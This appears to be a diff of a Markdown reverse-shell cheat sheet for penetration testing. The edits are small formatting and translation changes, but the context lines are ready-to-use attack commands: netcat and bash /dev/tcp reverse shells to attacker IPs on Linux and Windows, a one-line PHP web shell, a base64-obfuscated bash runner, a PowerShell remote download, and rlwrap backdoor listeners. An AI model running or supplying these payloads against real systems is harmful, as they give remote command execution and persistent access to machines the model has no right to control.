@@ -2,7 +2,7 @@
 
 ### Tools <a href="#tools" id="tools"></a>
 
-```
+```bash
 **Tools** 
 https://github.com/ShutdownRepo/shellerator
 https://github.com/0x00-0x00/ShellPop
@@ -18,7 +18,7 @@ Hack-tools
 
 ### Linux <a href="#linux" id="linux"></a>
 
-```
+```bash
 # Bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.21.0.0 1234 >/tmp/f
 nc -e /bin/sh 10.11.1.111 4443
@@ -27,11 +27,8 @@ bash -i >& /dev/tcp/IP ADDRESS/8080 0>&1
 /bin/sh -c 'sh -i >& /dev/tcp/10.10.14.130/1338 0>&1'
 /bin/nc -e /bin/bash 10.10.14.130 1338
 
-
-
-#Shell-básica-em-php 
+#Basic php shell 
 <?php system($_GET['cmd']); ?>
-
 
 # Bash B64 Ofuscated
 {echo,COMMAND_BASE64}|{base64,-d}|bash 
@@ -76,7 +73,7 @@ socat -d -d TCP4-LISTEN:443 STDOUT
 
 ### Windows <a href="#windows" id="windows"></a>
 
-```
+```bash
 # Netcat
 nc -e cmd.exe 10.11.1.111 4443
 
@@ -98,7 +95,9 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.g
 
 ### Tips <a href="#tips" id="tips"></a>
 
-```
+{% embed url="https://github.com/brightio/penelope" %}
+
+```bash
 #  rlwrap
 # https://linux.die.net/man/1/rlwrap
 # Connect to a netcat client:
@@ -114,4 +113,6 @@ rlwrap nc [Your IP Address] -e /bin/ash
 
 # Windows Backdoor Shell: 
 rlwrap nc -lv [localport] -e cmd.exe
+
+#
 ```
